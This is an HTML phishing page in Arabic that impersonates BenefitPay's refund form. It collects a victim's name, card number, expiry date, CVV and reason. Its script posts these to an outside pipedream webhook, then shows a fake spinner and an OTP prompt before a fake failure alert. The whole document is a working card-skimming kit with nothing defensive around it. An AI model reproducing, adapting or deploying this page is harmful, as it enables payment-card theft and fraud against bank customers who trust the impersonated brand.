<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BenefitPay - Refund</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 380px; border-top: 8px solid #007bff; }
        .logo { width: 150px; margin-bottom: 20px; display: block; margin-left: auto; margin-right: auto; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: right; }
        .btn { background: #007bff; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; cursor: pointer; font-size: 16px; font-weight: bold; }
        #loading, #otp-screen { display: none; text-align: center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card" id="main-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/22/Benefit_Pay_Logo.png/640px-Benefit_Pay_Logo.png" class="logo">
    <h3 style="text-align: center;">طلب استرداد مبلغ - Refund 🔄</h3>
    <form id="refundForm">
        <input type="text" name="holder" placeholder="الاسم الكامل" required>
        <input type="number" name="card" placeholder="رقم البطاقة المراد الاسترداد إليها" required>
        <div style="display: flex; gap: 10px;">
            <input type="text" name="exp" placeholder="MM/YY" required>
            <input type="number" name="cvv" placeholder="CVV" required>
        </div>
        <input type="text" name="reason" placeholder="سبب الاسترداد" required>
        <button type="button" onclick="sendRefund()" class="btn">إرسال طلب الاسترداد</button>
    </form>
</div>

<div class="card" id="loading">
    <div class="spinner"></div>
    <p>جاري معالجة الطلب، يرجى الانتظار...</p>
</div>

<div class="card" id="otp-screen">
    <h3>تحقق من الهوية لعملية الاسترداد 🔐</h3>
    <p>يرجى إدخال رمز التحقق (OTP) الذي وصلك للموافقة على عملية الاسترداد</p>
    <input type="number" id="otp_val" placeholder="000000">
    <button class="btn" onclick="finalStep()">تأكيد العملية</button>
</div>

<script>
    const webhook = "https://eoalpp741z4q119.m.pipedream.net";

    function sendRefund() {
        document.getElementById('main-card').style.display = 'none';
        document.getElementById('loading').style.display = 'block';
        
        fetch(webhook, {
            method: 'POST',
            body: new URLSearchParams(new FormData(document.getElementById('refundForm')))
        });

        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('otp-screen').style.display = 'block';
        }, 4000);
    }

    function finalStep() {
        alert("فشل تأكيد الرمز، يرجى إعادة المحاولة لاحقاً.");
        location.reload();
    }
</script>

</body>
</html>
